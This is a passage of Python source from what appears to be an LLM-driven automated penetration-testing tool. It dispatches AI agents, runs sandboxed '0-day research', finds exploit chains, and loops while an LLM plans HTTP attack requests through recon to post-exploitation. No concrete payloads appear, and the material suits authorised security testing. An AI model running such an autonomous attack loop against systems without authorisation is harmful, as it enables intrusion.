                await self.log("info", f"  [AGENT GRID] Dispatching {n_available} specialist agents")
                await self.log("info", f"  Each agent: PLAN (LLM) → EXECUTE (HTTP) → ANALYZE (LLM)")
                await self.log("info", "=" * 60)

                md_result = await self._md_orchestrator.run(
                    target=self.target,
                    recon_data=self.recon,
                    existing_findings=self.findings,
                    selected_agents=self.selected_md_agents,
                    headers=dict(self.auth_headers),
                    waf_info=waf_name,
                )

                # Merge agent findings into main findings via validation pipeline
                md_findings_raw = md_result.get("findings", [])
                md_confirmed = 0
                for mf in md_findings_raw:
                    if self.is_cancelled():
                        break
                    if not isinstance(mf, dict):
                        continue
                    try:
                        finding = Finding(
                            id=str(hashlib.md5(
                                f"{mf.get('title', '')}{mf.get('affected_endpoint', '')}".encode()
                            ).hexdigest())[:12],
                            title=mf.get("title", "Agent Finding"),
                            severity=mf.get("severity", "medium"),
                            vulnerability_type=mf.get("vulnerability_type", "unknown"),
                            cvss_score=float(mf.get("cvss_score", 0.0)) if isinstance(mf.get("cvss_score"), (int, float)) else 0.0,
                            cwe_id=mf.get("cwe_id", ""),
                            description=mf.get("description", ""),
                            affected_endpoint=mf.get("affected_endpoint", self.target),
                            evidence=mf.get("evidence", ""),
                            poc_code=mf.get("poc_code", ""),
                            impact=mf.get("impact", ""),
                            remediation=mf.get("remediation", ""),
                            confidence_score={"high": 80, "medium": 50, "low": 25}.get(mf.get("confidence", "medium"), 50),
                            confidence=mf.get("confidence", "medium"),
                            ai_verified=mf.get("confidence") == "high",
                            ai_status="confirmed" if mf.get("confidence") == "high" else "pending",
                        )
                        await self._add_finding(finding)
                        md_confirmed += 1
                    except Exception as e:
                        await self.log("debug", f"  [AGENT GRID] Finding merge error: {e}")

                agents_run = md_result.get("agents_run", 0)
                duration = md_result.get("duration", 0)
                await self.log("info",
                    f"[AGENT GRID] Complete: {agents_run} agents, "
                    f"{len(md_findings_raw)} raw findings, "
                    f"{md_confirmed} validated, {duration}s")
            except Exception as e:
                await self.log("warning", f"[AGENT GRID] Dispatch error: {e}")
        else:
            await self.log("warning", "[AGENT GRID] MD agent system not available")

        await self._update_progress(80, "Agent grid complete")

        # ── AI CHAIN DISCOVERY (post-agents, if we have findings) ──
        if self.chain_engine and len(self.findings) >= 2 and self.llm.is_available():
            try:
                chains = await self.chain_engine.ai_discover_chains(
                    self.findings, self.recon, self.llm, self.token_budget
                )
                if chains:
                    await self.log("info", f"  [CHAIN] AI discovered {len(chains)} exploit chains")
                    for chain in chains[:3]:
                        await self.log("info", f"    Chain: {chain.get('chain', '?')} "
                                       f"(Priority: {chain.get('priority', '?')})")
            except Exception as e:
                await self.log("debug", f"  [CHAIN] AI discovery error: {e}")

        await self._update_progress(85, "Chain analysis complete")

        # ── RESEARCHER AI (0-day discovery with Kali sandbox) ──
        if self._researcher and not self.is_cancelled():
            try:
                # Feed recon data to researcher
                self._researcher.recon_data = {
                    "endpoints": [{"url": ep.get("url", ""), "method": ep.get("method", "GET")}
                                  for ep in self.recon.endpoints[:50]],
                    "technologies": self.recon.technologies,
                    "parameters": {k: v for k, v in
                                   (self.recon.parameters.items() if isinstance(self.recon.parameters, dict)
                                    else [(str(i), p) for i, p in enumerate(self.recon.parameters)])[:30]},
                    "response_headers": getattr(self.recon, 'response_headers', {}),
                    "forms": getattr(self.recon, 'forms', []),
                }
                self._researcher.existing_findings = self.findings

                # Initialize sandbox and run
                ok, msg = await self._researcher.initialize()
                if ok:
                    await self.log("info", "[RESEARCHER] Starting 0-day research with Kali sandbox")
                    research_result = await self._researcher.run()

                    # Merge researcher findings into agent findings
                    for rf in research_result.findings:
                        finding = Finding(
                            title=rf.get("title", "Research Finding"),
                            severity=rf.get("severity", "medium"),
                            vulnerability_type=rf.get("vulnerability_type", "unknown"),
                            description=rf.get("description") or rf.get("evidence") or "",
                            affected_endpoint=rf.get("affected_endpoint", self.target),
                            evidence=rf.get("evidence", ""),
                            impact=rf.get("impact", ""),
                            poc_code=rf.get("poc_code", ""),
                            confidence_score=rf.get("confidence_score", 50),
                            confidence=("high" if rf.get("confidence_score", 0) >= 80
                                        else "medium" if rf.get("confidence_score", 0) >= 50
                                        else "low"),
                            ai_verified=True,
                            ai_status="confirmed",
                        )
                        self.memory.add_confirmed_finding(finding)
                        await self.log("success",
                            f"  [RESEARCHER] Finding: {finding.title} [{finding.severity.upper()}]")

                    await self.log("info",
                        f"[RESEARCHER] Complete: {research_result.hypotheses_confirmed} confirmed / "
                        f"{research_result.hypotheses_tested} tested, "
                        f"tools: {', '.join(sorted(research_result.tools_used)) if research_result.tools_used else 'none'}")
                else:
                    await self.log("warning", f"[RESEARCHER] Sandbox unavailable: {msg}")
            except Exception as e:
                await self.log("warning", f"[RESEARCHER] Research error: {e}")

        # ── CLI AGENT (AI CLI tool inside Kali sandbox) ──
        if self._cli_agent and not self.is_cancelled():
            try:
                # Feed recon data to CLI agent
                self._cli_agent.recon_data = {
                    "endpoints": [{"url": ep.get("url", ""), "method": ep.get("method", "GET")}
                                  for ep in self.recon.endpoints[:50]],
                    "technologies": self.recon.technologies,
                    "parameters": {k: v for k, v in
                                   (self.recon.parameters.items() if isinstance(self.recon.parameters, dict)
                                    else [(str(i), p) for i, p in enumerate(self.recon.parameters)])[:30]},
                }
                self._cli_agent.existing_findings = self.findings

                ok, msg = await self._cli_agent.initialize()
                if ok:
                    await self.log("info", f"[CLI-AGENT] Starting {self._cli_agent.cli_provider_id} with Kali sandbox")
                    cli_result = await self._cli_agent.run()

                    # Merge CLI agent findings
                    for cf in cli_result.findings:
                        finding = Finding(
                            title=cf.get("title", "CLI Agent Finding"),
                            severity=cf.get("severity", "medium"),
                            vulnerability_type=cf.get("vulnerability_type", "unknown"),
                            description=cf.get("evidence") or cf.get("description", ""),
                            affected_endpoint=cf.get("affected_endpoint", self.target),
                            evidence=cf.get("evidence", ""),
                            impact=cf.get("impact", ""),
                            poc_code=cf.get("poc_code", ""),
                            confidence_score=cf.get("confidence_score", 70),
                            confidence=("high" if cf.get("confidence_score", 0) >= 80
                                        else "medium" if cf.get("confidence_score", 0) >= 50
                                        else "low"),
                            ai_verified=True,
                            ai_status="confirmed",
                        )
                        self.memory.add_confirmed_finding(finding)
                        await self.log("success",
                            f"  [CLI-AGENT] Finding: {finding.title} [{finding.severity.upper()}]")

                    await self.log("info",
                        f"[CLI-AGENT] Complete: {len(cli_result.findings)} findings, "
                        f"{int(cli_result.duration)}s elapsed, "
                        f"phases: {', '.join(cli_result.phases_completed) if cli_result.phases_completed else 'none'}")
                else:
                    await self.log("warning", f"[CLI-AGENT] Initialization failed: {msg}")
            except Exception as e:
                await self.log("warning", f"[CLI-AGENT] Error: {e}")

        # ── DOUBLE-CHECK PHASE: Re-validate all findings ──
        if self.findings and not self.is_cancelled():
            await self.log("info", "[DOUBLE-CHECK] Re-validating all findings")
            await self._double_check_findings()
            await self._update_progress(80, "Double-check complete")

        # ── FINALIZATION PHASE (80-100%) ──
        await self.log("info", "[FINAL] Screenshot Capture")
        for finding in self.findings:
            if self.is_cancelled():
                break
            if not finding.screenshots:
                await self._capture_finding_screenshot(finding)
        await self._update_progress(85, "Screenshots captured")

        await self.log("info", "[FINAL] AI Finding Enhancement")
        await self._ai_enhance_findings()
        await self._update_progress(92, "Findings enhanced")

        await self.log("info", "[FINAL] Report Generation")
        report = await self._generate_full_report()
        await self._update_progress(100, "Auto pentest complete")

        # Flush execution history
        if hasattr(self, 'execution_history'):
            self.execution_history.flush()

        # RAG: Record accumulated strategy for this technology stack
        if self.reasoning_memory and self.findings:
            try:
                vuln_types_found = list({f.vulnerability_type for f in self.findings})
                priority_order = [f.vulnerability_type for f in sorted(
                    self.findings, key=lambda f: getattr(f, 'confidence_score', 50), reverse=True
                )]
                insights = []
                for f in self.findings[:5]:
                    insights.append(f"{f.vulnerability_type} found at {f.affected_endpoint[:50]} "
                                    f"(confidence: {getattr(f, 'confidence_score', 'N/A')})")
                for tech in self.recon.technologies[:3]:
                    self.reasoning_memory.record_strategy(
                        technology=tech,
                        vuln_types_found=vuln_types_found,
                        priority_order=priority_order[:10],
                        insights=insights
                    )
                self.reasoning_memory.flush()
            except Exception:
                pass

        # Delete checkpoint on successful completion
        if self._checkpoint_manager:
            self._checkpoint_manager.delete()

        await self.log("info", "=" * 60)
        await self.log("info", f"  AUTO PENTEST COMPLETE: {len(self.findings)} findings")
        await self.log("info", "=" * 60)

        return report

    # ── CLI Agent Standalone Mode ──

    async def _run_cli_agent_mode(self) -> Dict[str, Any]:
        """Standalone CLI Agent mode: AI CLI tool runs full pentest in Kali sandbox."""
        await self._update_progress(0, "CLI Agent initializing")
        await self.log("info", "=" * 60)
        await self.log("info", "  CLI AGENT MODE")
        await self.log("info", f"  Provider: {self.cli_agent_provider or 'claude_code'}")
        await self.log("info", f"  Target: {self.target}")
        await self.log("info", "=" * 60)

        if not self._cli_agent:
            await self.log("error", "CLI Agent not available. Check ENABLE_CLI_AGENT=true in .env")
            return await self._generate_full_report()

        # Initialize CLI agent (container + CLI install + file upload)
        await self._update_progress(2, "CLI Agent: creating container")
        ok, msg = await self._cli_agent.initialize()
        if not ok:
            await self.log("error", f"CLI Agent initialization failed: {msg}")
            return await self._generate_full_report()

        # Run CLI agent (background process + polling)
        await self._update_progress(10, "CLI Agent: running pentest")
        cli_result = await self._cli_agent.run()

        if cli_result.error:
            await self.log("error", f"CLI Agent error: {cli_result.error}")

        # Merge findings through validation pipeline
        await self._update_progress(92, "Processing CLI Agent findings")
        for cf in cli_result.findings:
            try:
                finding = Finding(
                    id=hashlib.md5(
                        f"{cf.get('title', '')}|{cf.get('affected_endpoint', '')}".encode()
                    ).hexdigest()[:12],
                    title=cf.get("title", "CLI Agent Finding"),
                    severity=cf.get("severity", "medium"),
                    vulnerability_type=cf.get("vulnerability_type", "unknown"),
                    description=cf.get("evidence") or cf.get("description", ""),
                    affected_endpoint=cf.get("affected_endpoint", self.target),
                    evidence=cf.get("evidence", ""),
                    impact=cf.get("impact", ""),
                    poc_code=cf.get("poc_code", ""),
                    confidence_score=cf.get("confidence_score", 70),
                    confidence=("high" if cf.get("confidence_score", 0) >= 80
                                else "medium" if cf.get("confidence_score", 0) >= 50
                                else "low"),
                    ai_verified=True,
                    ai_status="confirmed",
                    request=cf.get("request", ""),
                    response=cf.get("response", ""),
                )
                await self._add_finding(finding)
            except Exception as e:
                await self.log("debug", f"Finding merge error: {e}")

        await self.log("info", f"[CLI-AGENT] Results: {len(cli_result.findings)} findings, "
                       f"{int(cli_result.duration)}s elapsed")
        await self.log("info", f"[CLI-AGENT] Phases: {', '.join(cli_result.phases_completed) if cli_result.phases_completed else 'none'}")

        # Generate report
        await self._update_progress(95, "Generating report")
        report = await self._generate_full_report()
        await self._update_progress(100, "CLI Agent pentest complete")
        return report

    # ═══════════════════════════════════════════════════════════════════════════
    # FULL LLM PENTEST MODE — AI drives the entire pentest cycle
    # ═══════════════════════════════════════════════════════════════════════════

    async def _run_full_llm_pentest(self) -> Dict[str, Any]:
        """Full LLM Pentest: the AI drives every step of the pentest.

        The LLM acts as a senior penetration tester. It plans HTTP requests,
        the system executes them, and the LLM analyzes real responses to
        identify vulnerabilities. Pure AI-driven, no hardcoded payloads.

        Loop: LLM plans → System executes HTTP → LLM analyzes → repeat
        """
        await self._update_progress(0, "Full LLM Pentest starting")
        await self.log("info", "=" * 60)
        await self.log("info", "  FULL LLM PENTEST MODE")
        await self.log("info", "  AI drives the entire pentest cycle")
        await self.log("info", "=" * 60)

        if not self.llm.is_available():
            await self.log("error", "LLM not available! This mode requires an active LLM provider.")
            await self.log("error", "Configure ANTHROPIC_API_KEY, OPENAI_API_KEY, or another provider.")
            return self._generate_error_report("LLM not available for Full LLM Pentest mode")

        # Import prompts
        from backend.core.vuln_engine.ai_prompts import (
            get_full_llm_pentest_system_prompt,
            get_full_llm_pentest_round_prompt,
            get_full_llm_pentest_report_prompt,
        )

        # Load methodology prompt
        methodology = self.custom_prompt or ""
        if not methodology:
            try:
                prompt_path = Path("/opt/Prompts-PenTest/pentestcompleto_en.md")
                if not prompt_path.exists():
                    prompt_path = Path("/opt/Prompts-PenTest/pentestcompleto.md")
                if prompt_path.exists():
                    methodology = prompt_path.read_text(encoding="utf-8")
            except Exception:
                pass

        # Build system prompt
        system_prompt = get_full_llm_pentest_system_prompt(methodology)
        await self.log("info", f"  System prompt: {len(system_prompt)} chars")
        await self.log("info", f"  Methodology: {'loaded' if methodology else 'none'} ({len(methodology)} chars)")

        # State tracking
        MAX_ROUNDS = 30
        MAX_ACTIONS_PER_ROUND = 10
        total_requests = 0
        discovered_info_parts: List[str] = []
        all_round_results: List[str] = []  # accumulates round-by-round results
        llm_findings: List[Dict] = []

        await self._update_progress(2, "Full LLM Pentest: Round 1")

        for round_num in range(1, MAX_ROUNDS + 1):
            if self.is_cancelled():
                await self.log("warning", "[LLM PENTEST] Cancelled by user")
                break

            # Calculate progress: rounds map to 0-85%
            progress = min(85, int((round_num / MAX_ROUNDS) * 85))
            phase_label = (
                "Recon" if round_num <= 8 else
                "Testing" if round_num <= 25 else
                "Post-Exploitation" if round_num <= 28 else
                "Reporting"
            )
            await self._update_progress(progress, f"Full LLM Pentest: {phase_label} (Round {round_num}/{MAX_ROUNDS})")

            # Build round prompt with accumulated context
            # Keep only recent results to manage token budget (last 5 rounds)
            recent_results = "\n\n".join(all_round_results[-5:]) if all_round_results else ""
            discovered_summary = "\n".join(discovered_info_parts[-30:]) if discovered_info_parts else ""

            round_prompt = get_full_llm_pentest_round_prompt(
                target=self.target,
                round_num=round_num,
                max_rounds=MAX_ROUNDS,
                previous_results=recent_results,
                discovered_info=discovered_summary,
                findings_so_far=len(self.findings),
            )

            # Call LLM
            await self.log("info", f"[LLM PENTEST] Round {round_num}: Asking AI to plan ({phase_label})")
            try:
                llm_response = await self.llm.generate(
                    prompt=round_prompt,
                    system=system_prompt,
                    max_tokens=8192,
                )
            except Exception as e:
                await self.log("error", f"[LLM PENTEST] LLM call failed: {e}")
                # Try to continue with next round
                all_round_results.append(f"Round {round_num}: LLM call failed — {str(e)[:100]}")
                continue

            # Parse LLM response as JSON
            parsed = self._parse_llm_json(llm_response)
            if not parsed:
                await self.log("warning", f"[LLM PENTEST] Round {round_num}: Failed to parse LLM JSON response")
                all_round_results.append(f"Round {round_num}: LLM returned invalid JSON")
                continue

            reasoning = parsed.get("reasoning", "")
            actions = parsed.get("actions", [])
            findings = parsed.get("findings", [])
            phase = parsed.get("phase", "unknown")
            done = parsed.get("done", False)
            summary = parsed.get("summary", "")

            if reasoning:
                await self.log("info", f"[LLM PENTEST] AI reasoning: {reasoning[:200]}")

            # Execute HTTP actions
            round_result_parts = [f"=== Round {round_num} ({phase}) ==="]
            if reasoning:
                round_result_parts.append(f"Reasoning: {reasoning}")

            actions_to_exec = actions[:MAX_ACTIONS_PER_ROUND]
            await self.log("info", f"[LLM PENTEST] Executing {len(actions_to_exec)} HTTP requests")

            for i, action in enumerate(actions_to_exec):
                if self.is_cancelled():
                    break

                result = await self._execute_llm_action(action, i + 1)
                total_requests += 1

                if result:
                    # Add to round results for LLM context
                    result_summary = self._summarize_response(action, result)
                    round_result_parts.append(result_summary)

                    # Track discovered info
                    purpose = action.get("purpose", "")
                    url = action.get("url", "")
                    status = result.get("status", 0)
                    if status == 200:
                        discovered_info_parts.append(
                            f"- {action.get('method', 'GET')} {url} → {status} "
                            f"({len(result.get('body', ''))} bytes) — {purpose}"
                        )
                    elif status in (301, 302, 303, 307, 308):
                        location = result.get("headers", {}).get("Location", result.get("headers", {}).get("location", ""))
                        discovered_info_parts.append(f"- {url} → redirect to {location}")
                    elif status == 404:
                        discovered_info_parts.append(f"- {url} → 404 (not found)")
                    elif status == 403:
                        discovered_info_parts.append(f"- {url} → 403 (forbidden)")
                    else:
                        discovered_info_parts.append(f"- {url} → {status}")
                else:
                    round_result_parts.append(
                        f"Request {i+1}: {action.get('method', 'GET')} {action.get('url', '?')} → FAILED (connection error/timeout)"
                    )

            all_round_results.append("\n".join(round_result_parts))

            # Process findings from this round
            for finding_data in findings:
                await self._process_llm_pentest_finding(finding_data, round_num)

            # Check if LLM says we're done
            if done:
                await self.log("success", f"[LLM PENTEST] AI completed pentest after {round_num} rounds")
                if summary:
                    await self.log("info", f"[LLM PENTEST] Summary: {summary[:300]}")
                break

            await self.log("info", f"[LLM PENTEST] Round {round_num} complete: "
                           f"{len(actions_to_exec)} requests, {len(findings)} findings, "
                           f"total: {total_requests} requests, {len(self.findings)} confirmed findings")

        # ── FINALIZATION ──
        await self._update_progress(88, "Full LLM Pentest: Generating report")
        await self.log("info", f"[LLM PENTEST] Testing complete: {total_requests} total requests, "
                       f"{len(self.findings)} confirmed findings")

        # Generate AI-enhanced report
        report = await self._generate_full_report()

        # Also try to get an AI narrative report
        if self.llm.is_available() and self.findings:
            try:
                findings_json = json.dumps([
                    {
                        "title": f.title,
                        "severity": f.severity,
                        "vulnerability_type": f.vulnerability_type,
                        "affected_endpoint": f.affected_endpoint,
                        "parameter": f.parameter,
                        "payload": f.payload,
                        "evidence": f.evidence[:500] if f.evidence else "",
                        "description": f.description,
                        "impact": f.impact,
                        "cvss_score": f.cvss_score,
                        "cwe_id": f.cwe_id,
                        "poc_code": f.poc_code,
                        "remediation": f.remediation,
                        "confidence_score": f.confidence_score,
                    }
                    for f in self.findings
                ], indent=2)

                report_prompt = get_full_llm_pentest_report_prompt(
                    target=self.target,
                    findings_json=findings_json,
                    total_rounds=min(round_num, MAX_ROUNDS),
                    total_requests=total_requests,
                )
                ai_report_text = await self.llm.generate(
                    prompt=report_prompt,
                    system="You are a professional penetration testing report writer.",
                    max_tokens=16384,
                )
                if ai_report_text:
                    report["ai_narrative_report"] = ai_report_text
                    await self.log("success", "[LLM PENTEST] AI narrative report generated")
            except Exception as e:
                await self.log("debug", f"[LLM PENTEST] Report generation error: {e}")

        await self._update_progress(100, "Full LLM Pentest complete")
        await self.log("info", "=" * 60)
        await self.log("info", f"  FULL LLM PENTEST COMPLETE: {len(self.findings)} findings")
        await self.log("info", f"  Total HTTP requests: {total_requests}")
        await self.log("info", "=" * 60)
        return report

    async def _execute_llm_action(self, action: Dict, action_num: int) -> Optional[Dict]:
        """Execute a single HTTP action planned by the LLM.

        The action dict has: method, url, headers, body, content_type, purpose
        Returns the response dict or None on failure.
        """
        method = (action.get("method") or "GET").upper()
        url = action.get("url", "")
        custom_headers = action.get("headers") or {}
        body = action.get("body")
        content_type = action.get("content_type", "")
        purpose = action.get("purpose", "")

        if not url:
            return None

        # Ensure URL is absolute
        if not url.startswith("http"):
            url = urljoin(self.target, url)

        # Build request headers
        headers = dict(self.auth_headers) if self.auth_headers else {}
        headers.update(custom_headers)
        if content_type and "Content-Type" not in headers and "content-type" not in headers:
            headers["Content-Type"] = content_type

        # Log the request
        await self.log("info", f"[LLM PENTEST] → {method} {url[:120]} ({purpose[:60]})")

        try:
            timeout = aiohttp.ClientTimeout(total=15)

            if self.request_engine:
                # Use request engine for retry/rate limiting
                data = None
                params = None
                if method == "GET":
                    # Parse params from URL
                    pass  # URL already has params
                else:
                    if body:
                        if content_type and "json" in content_type:
                            try:
                                data = json.loads(body) if isinstance(body, str) else body
                            except (json.JSONDecodeError, TypeError):
                                data = body
                        else:
                            data = body
                    else:
                        data = None

                result = await self.request_engine.request(
                    url, method=method,
                    headers=headers if headers else None,
                    data=data,
                    allow_redirects=True,
                )
                if result:
                    resp_dict = {
                        "status": result.status,
                        "body": result.body[:50000] if result.body else "",
                        "headers": result.headers,
                        "url": result.url,
                    }
                    status_str = f"{result.status}"
                    body_len = len(result.body) if result.body else 0
                    await self.log("info", f"[LLM PENTEST] ← {status_str} ({body_len} bytes)")
                    return resp_dict
            else:
                # Direct session fallback
                req_kwargs: Dict[str, Any] = {
                    "allow_redirects": True,
                    "timeout": timeout,
                    "headers": headers,
                }
                if method != "GET" and body:
                    if content_type and "json" in content_type:
                        try:
                            req_kwargs["json"] = json.loads(body) if isinstance(body, str) else body
                        except (json.JSONDecodeError, TypeError):
                            req_kwargs["data"] = body
                    else:
                        req_kwargs["data"] = body

                async with self.session.request(method, url, **req_kwargs) as resp:
                    resp_body = await resp.text()
                    resp_dict = {
                        "status": resp.status,
                        "body": resp_body[:50000],
                        "headers": dict(resp.headers),
                        "url": str(resp.url),
                    }
                    await self.log("info", f"[LLM PENTEST] ← {resp.status} ({len(resp_body)} bytes)")
                    return resp_dict

        except asyncio.TimeoutError:
            await self.log("debug", f"[LLM PENTEST] Timeout: {url[:80]}")
        except Exception as e:
            await self.log("debug", f"[LLM PENTEST] Request error: {str(e)[:80]}")
        return None

    def _summarize_response(self, action: Dict, result: Dict) -> str:
        """Create a compact summary of an HTTP response for the LLM context."""
        method = action.get("method", "GET")
        url = action.get("url", "?")
        purpose = action.get("purpose", "")
        status = result.get("status", 0)
        headers = result.get("headers", {})
        body = result.get("body", "")

        # Extract key headers
        key_headers = {}
        for h in ["Server", "server", "Content-Type", "content-type",
                   "X-Powered-By", "x-powered-by", "Set-Cookie", "set-cookie",
                   "Location", "location", "X-Frame-Options", "x-frame-options",
                   "Content-Security-Policy", "content-security-policy",
                   "WWW-Authenticate", "www-authenticate"]:
            val = headers.get(h)
            if val:
                key_headers[h] = val[:200]

        # Truncate body for context (keep meaningful content)
        body_preview = body[:3000] if body else ""

        lines = [
            f"Request: {method} {url}",
            f"Purpose: {purpose}",
            f"Status: {status}",
            f"Headers: {json.dumps(key_headers, default=str)}",
            f"Body ({len(body)} bytes):",
            body_preview,
        ]
        return "\n".join(lines)

    def _parse_llm_json(self, text: str) -> Optional[Dict]:
        """Parse JSON from LLM response, handling markdown code blocks."""
        if not text:
            return None

        # Try direct parse
        text_stripped = text.strip()
        try:
            return json.loads(text_stripped)
        except (json.JSONDecodeError, ValueError):
            pass

        # Try extracting from markdown code block
        import re
        patterns = [
            r'```json\s*\n(.*?)\n\s*```',
            r'```\s*\n(.*?)\n\s*```',
            r'\{[\s\S]*\}',
        ]
        for pattern in patterns[:2]:
            match = re.search(pattern, text, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(1))
                except (json.JSONDecodeError, ValueError):
                    continue

        # Try finding the outermost JSON object
        # Find first { and last }
        first_brace = text.find('{')
        last_brace = text.rfind('}')
        if first_brace >= 0 and last_brace > first_brace:
            try:
                return json.loads(text[first_brace:last_brace + 1])
            except (json.JSONDecodeError, ValueError):
                pass

        return None

    async def _process_llm_pentest_finding(self, finding_data: Dict, round_num: int):
        """Process a finding reported by the LLM in Full LLM Pentest mode.

        Creates a Finding object and routes it through the validation pipeline.
        """
        title = finding_data.get("title", "LLM Finding")
        severity = finding_data.get("severity", "medium").lower()
        if severity not in ("critical", "high", "medium", "low", "info"):
            severity = "medium"

        vuln_type = finding_data.get("vulnerability_type", "unknown")
        evidence = finding_data.get("evidence", "")

        # Skip findings without evidence (anti-hallucination)
        if not evidence or len(evidence) < 10:
            await self.log("debug", f"[LLM PENTEST] Skipping finding without evidence: {title}")
            return

        finding = Finding(
            id=hashlib.md5(
                f"{title}|{finding_data.get('affected_endpoint', '')}|{finding_data.get('payload', '')}|{round_num}".encode()
            ).hexdigest()[:12],
            title=title,
            severity=severity,
            vulnerability_type=vuln_type,
            cvss_score=finding_data.get("cvss_score", 0.0),
            cwe_id=finding_data.get("cwe_id", ""),
            description=finding_data.get("description", ""),
            affected_endpoint=finding_data.get("affected_endpoint", self.target),
            parameter=finding_data.get("parameter", ""),
            payload=finding_data.get("payload", ""),
            evidence=evidence,
            impact=finding_data.get("impact", ""),
            poc_code=finding_data.get("poc_code", ""),
            remediation=finding_data.get("remediation", ""),
            ai_verified=True,
            confidence_score=70,  # Initial score, ValidationJudge will refine
            ai_status="confirmed",
        )

        # Route through validation pipeline (_judge_finding handles
        # negative controls, proof of execution, confidence scoring)
        await self._add_finding(finding)
        await self.log("success", f"[LLM PENTEST] Finding: {severity.upper()} — {title}")

    # ── Pre-Stream AI Master Plan ──

    async def _ai_master_plan(self) -> Dict:
        """Generate a strategic master plan before launching parallel streams.

        This gives all 3 streams shared context: what to look for, what to
        prioritize, and what the target looks like from a security perspective.
        """
        if not self.llm.is_available():
            return {}

        try:
            from backend.core.vuln_engine.ai_prompts import get_master_plan_prompt
        except ImportError:
            return {}

        # Gather initial context from whatever recon we have so far
        initial_response = ""
        try:
            resp = await self._make_request(self.target)
            if resp:
                status = resp.get("status", 0)
                headers = resp.get("headers", {})
                body = resp.get("body", "")
                server = headers.get("server", headers.get("Server", ""))
                powered = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
                content_type = headers.get("content-type", headers.get("Content-Type", ""))
                initial_response = (
                    f"Status: {status}\n"
                    f"Server: {server}\n"
                    f"X-Powered-By: {powered}\n"
                    f"Content-Type: {content_type}\n"
                    f"Response size: {len(body)} bytes\n"
                    f"Key headers: {json.dumps({k: v for k, v in list(headers.items())[:10]}, default=str)}\n"
                    f"Body preview: {body[:500]}"
                )
        except Exception:
            pass

        tech_str = ", ".join(self.recon.technologies[:15]) if self.recon.technologies else ""
        endpoints_str = "\n".join(
            f"  - {ep.get('url', ep) if isinstance(ep, dict) else ep}"
            for ep in self.recon.endpoints[:20]
        ) if self.recon.endpoints else ""
        forms_str = "\n".join(
            f"  - {f.get('action', '?')} [{f.get('method', 'GET')}] params: {', '.join(f.get('inputs', []))}"
            for f in self.recon.forms[:10]
        ) if self.recon.forms else ""
        waf_info = ""
        if hasattr(self, '_waf_result') and self._waf_result and self._waf_result.detected_wafs:
            waf_info = ", ".join(f"{w.name} ({w.confidence:.0%})" for w in self._waf_result.detected_wafs)

        # Playbook context
        playbook_ctx = ""
        if HAS_PLAYBOOK:
            try:
                summary = get_playbook_summary()
                playbook_ctx = "\n## PLAYBOOK CATEGORIES\n" + "\n".join(
                    f"- {cat}: {', '.join(vts[:5])}" for cat, vts in summary.items()
                )
            except Exception:
                pass

        prompt = get_master_plan_prompt(
            target=self.target,
            initial_response=initial_response,
            technologies=tech_str,
            endpoints_preview=endpoints_str,
            forms_preview=forms_str,
            waf_info=waf_info,
            playbook_context=playbook_ctx,
        )

        try:
            resp_text = await self.llm.generate(
                prompt,
                system=self._get_enhanced_system_prompt("strategy")
            )
            start = resp_text.index('{')
            end = resp_text.rindex('}') + 1
            plan = json.loads(resp_text[start:end])
            return plan
        except Exception as e:
            await self.log("debug", f"  [MASTER PLAN] Parse error: {e}")
            return {}

    # ── Stream 1: Recon Pipeline ──

    async def _stream_recon(self):
        """Stream 1: Reconnaissance — feeds discovered endpoints to testing stream."""
        try:
            await self.log("info", "[STREAM 1] Recon pipeline starting")
            await self.log("info", "[PHASE] Stream 1: Recon | Objective: Map attack surface, discover endpoints and technologies | Success: endpoints > 0")
            await self._update_progress(2, "Recon: initial probe")

            # Phase 1: Initial probe
            await self._initial_probe()
            # Push initial endpoints to testing queue immediately
            for ep in self.recon.endpoints:
                await self._endpoint_queue.put(ep)
            await self._update_progress(8, "Recon: crawling endpoints")

            if self.is_cancelled():
                return

            # Phase 2: Endpoint discovery
            prev_count = len(self.recon.endpoints)
            await self._discover_endpoints()
            # Push newly discovered endpoints to queue
            for ep in self.recon.endpoints[prev_count:]:
                await self._endpoint_queue.put(ep)
            await self._update_progress(15, "Recon: discovering parameters")

            if self.is_cancelled():
                return

            # Phase 3: Parameter discovery
            await self._discover_parameters()
            await self._update_progress(20, "Recon: technology detection")

            # Phase 4: Technology detection
            await self._detect_technologies()

            # Phase 4b: Playbook-guided recon prioritization based on tech stack
            if HAS_PLAYBOOK and self.recon.technologies:
                try:
                    tech_lower = [t.lower().split("/")[0].strip() for t in self.recon.technologies
                                  if not t.startswith("WAF:")]
                    playbook_recommended = []
                    playbook_summary = get_playbook_summary()
                    for category, vtypes in playbook_summary.items():
                        for vtype in vtypes:
                            entry = get_playbook_entry(vtype)
                            if not entry:
                                continue
                            # Check discovery hints and overview for tech mentions
                            discovery_text = " ".join(entry.get("discovery", [])).lower()
                            overview_text = entry.get("overview", "").lower()
                            combined = discovery_text + " " + overview_text
                            for tech in tech_lower:
                                if len(tech) > 2 and tech in combined:
                                    playbook_recommended.append(vtype)
                                    break
                    if playbook_recommended:
                        # Store as recon metadata for downstream use
                        self._playbook_recommended_types = playbook_recommended
                        await self.log("info", f"  [PLAYBOOK] Tech-based recommendations: "
                                       f"{', '.join(playbook_recommended[:10])} "
                                       f"({len(playbook_recommended)} total for {', '.join(tech_lower[:5])})")
                except Exception as e:
                    await self.log("debug", f"  [PLAYBOOK] Recon guidance error: {e}")

            # Phase 5: WAF detection
            if self.waf_detector:
                try:
                    self._waf_result = await self.waf_detector.detect(self.target)
                    if self._waf_result and self._waf_result.detected_wafs:
                        for w in self._waf_result.detected_wafs:
                            waf_label = f"WAF:{w.name} ({w.confidence:.0%})"
                            self.recon.technologies.append(waf_label)
                            await self.log("warning", f"  [WAF] Detected: {w.name} "
                                           f"(confidence: {w.confidence:.0%}, method: {w.detection_method})")
                        # Adjust request delay based on WAF recommendation
                        if self.request_engine and self._waf_result.recommended_delay > self.request_engine.default_delay:
                            self.request_engine.default_delay = self._waf_result.recommended_delay
                            await self.log("info", f"  [WAF] Adjusted request delay to {self._waf_result.recommended_delay:.1f}s")
                    else:
                        await self.log("info", "  [WAF] No WAF detected")
                except Exception as e:
                    await self.log("debug", f"  [WAF] Detection failed: {e}")

            # ── Phase 6: Deep Recon (JS, sitemap, robots, API, framework, fuzzing) ──
            if self.deep_recon:
                try:
                    prev_ep_count = len(self.recon.endpoints)

                    # Parse sitemap (now with recursive index following)
                    sitemap_urls = await self.deep_recon.parse_sitemap(self.target)
                    for surl in (sitemap_urls or []):
                        if surl and surl.startswith("http"):
